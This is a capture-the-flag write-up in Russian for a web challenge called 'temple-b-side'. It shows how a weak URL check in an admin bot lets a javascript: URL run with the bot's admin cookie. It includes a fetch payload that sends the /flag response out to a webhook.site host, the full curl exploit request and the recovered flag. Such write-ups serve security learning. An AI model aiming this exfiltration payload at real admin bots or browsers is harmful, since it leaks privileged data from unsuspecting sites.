# temple-b-side writeup

Сначала получаем валидный `save` cookie для своего пользователя. Это можно сделать через публичный `POST /postcard-from-nyc`, потому что эндпоинт сам подписывает JWT и возвращает его в `Set-Cookie`.

Пример:

```http
POST /postcard-from-nyc HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

name=batyr&portrait=&flag=dice%7Ba%7D
```

В ответе приходит:

```http
Set-Cookie: save=eyJ...
```

Дальше этот cookie нужен только для доступа к `/report`, потому что `/report` требует аутентификацию и без `save` отдаёт `403`.

Ключевой баг находится в боте. Бот:

1. открывает `http://localhost:8080/postcard-from-nyc`
2. вводит туда флаг
3. отправляет форму
4. после этого остаётся на сайте с валидным admin-cookie
5. затем делает `page.goto(targetUrl)` для URL из `/report`

Проверка `targetUrl` слабая: там просто вызывается `new URL(targetUrl)`. Из-за этого проходит схема `javascript:`.

Значит в `/report` можно передать `javascript:`-URL, который выполнится в контексте уже открытой страницы `http://localhost:8080`, где у бота есть admin-cookie.

Полезная нагрузка:

```javascript
javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/WEBHOOK_ID/?flag='+encodeURIComponent(f))
```

Она делает запрос к `/flag` от имени бота, получает флаг и уводит браузер на webhook с флагом в query string.

Итоговый запрос:


```bash
curl -i 'http://TARGET/report' \
  -X POST \
  -H 'Cookie: save=eyJ...' \
  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/WEBHOOK_ID/?flag='+encodeURIComponent(f))"
```

После визита бота на webhook приходит запрос вида:

```text
https://webhook.site/WEBHOOK_ID/?flag=dice%7B...
```

Из него и достаётся флаг:

```text
dice{neves_xis_cixot_eb_ot_tey_hguone_gnol_galf_siht_si_syawyna_ijome_lluks_eseehc_eht_rof_llef_dna_part_eht_togrof_i_derit_os_saw_i_galf_siht_gnitirw_fo_sa_sruoh_42_rof_ekawa_neeb_evah_i_tcaf_nuf}
```
